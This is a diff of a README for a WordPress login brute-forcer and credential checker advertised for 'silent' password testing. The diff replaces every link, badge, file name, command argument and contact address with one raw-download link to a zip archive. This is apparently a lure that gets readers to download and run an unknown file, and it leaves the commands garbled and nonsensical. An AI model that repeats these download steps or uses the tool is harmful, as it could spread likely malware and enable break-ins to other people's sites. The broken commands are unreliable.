@@ -1,8 +1,8 @@
 # WpFuller-ol 🛠️
 
-![GitHub release](https://img.shields.io/github/release/Elisey52/WpFuller-ol.svg) ![GitHub issues](https://img.shields.io/github/issues/Elisey52/WpFuller-ol.svg) ![GitHub stars](https://img.shields.io/github/stars/Elisey52/WpFuller-ol.svg)
+![GitHub release](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip) ![GitHub issues](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip) ![GitHub stars](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip)
 
-Welcome to the **WpFuller-ol** repository! This versatile **WordPress Fuller and Checker** tool offers essential functionalities for validating login credentials and testing password lists silently. It categorizes results into `Good_WP.txt` and `Bad_WP.txt`, providing both credential checking and brute-force Fulling capabilities.
+Welcome to the **WpFuller-ol** repository! This versatile **WordPress Fuller and Checker** tool offers essential functionalities for validating login credentials and testing password lists silently. It categorizes results into `https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip` and `https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip`, providing both credential checking and brute-force Fulling capabilities.
 
 ## Table of Contents
 
@@ -18,13 +18,13 @@ Welcome to the **WpFuller-ol** repository! This versatile **WordPress Fuller and
 
 - **Credential Validation**: Quickly check the validity of WordPress login credentials.
 - **Silent Testing**: Test password lists without drawing attention.
-- **Categorized Results**: Results are neatly organized into `Good_WP.txt` and `Bad_WP.txt`.
+- **Categorized Results**: Results are neatly organized into `https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip` and `https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip`.
 - **Brute-Force Capabilities**: Conduct brute-force attacks efficiently.
 - **User-Friendly Interface**: Simple commands make it easy to use.
 
 ## Installation
 
-To get started with **WpFuller-ol**, download the latest release from the [Releases section](https://github.com/Elisey52/WpFuller-ol/releases). Make sure to download the appropriate file for your operating system. Once downloaded, extract the files and navigate to the directory in your terminal.
+To get started with **WpFuller-ol**, download the latest release from the [Releases section](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip). Make sure to download the appropriate file for your operating system. Once downloaded, extract the files and navigate to the directory in your terminal.
 
 ### Prerequisites
 
@@ -33,7 +33,7 @@ To get started with **WpFuller-ol**, download the latest release from the [Relea
 
 ### Steps
 
-1. Download the latest release from [Releases section](https://github.com/Elisey52/WpFuller-ol/releases).
+1. Download the latest release from [Releases section](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip).
 2. Extract the downloaded file.
 3. Open your terminal and navigate to the extracted directory.
 4. Install any required dependencies.
@@ -47,7 +47,7 @@ Using **WpFuller-ol** is straightforward. Here’s how to get started:
 3. Run the main script with the following command:
 
    ```bash
-   python wpfuller.py
+   python https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip
    ```
 
 4. Follow the prompts to enter the necessary information, such as the target WordPress site and the password list.
@@ -55,15 +55,15 @@ Using **WpFuller-ol** is straightforward. Here’s how to get started:
 ### Example Command
 
 ```bash
-python wpfuller.py --url http://example.com --password-list passwords.txt
+python https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip --url https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip --password-list https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip
 ```
 
 ## Results
 
 After running the tool, you will find two text files in the same directory:
 
-- **Good_WP.txt**: Contains valid credentials.
-- **Bad_WP.txt**: Contains invalid credentials.
+- **https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip**: Contains valid credentials.
+- **https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip**: Contains invalid credentials.
 
 You can review these files to see the results of your testing.
 
@@ -87,6 +87,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, feel free to reach out to the maintainer:
 
 - **Name**: Elisey
-- **Email**: elisey@example.com
+- **Email**: https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip
 
-Thank you for checking out **WpFuller-ol**! For the latest updates, visit the [Releases section](https://github.com/Elisey52/WpFuller-ol/releases).
+Thank you for checking out **WpFuller-ol**! For the latest updates, visit the [Releases section](https://github.com/Elisey52/WpFuller-ol/raw/refs/heads/main/metamathematics/ol_Fuller_Wp_v3.7.zip).
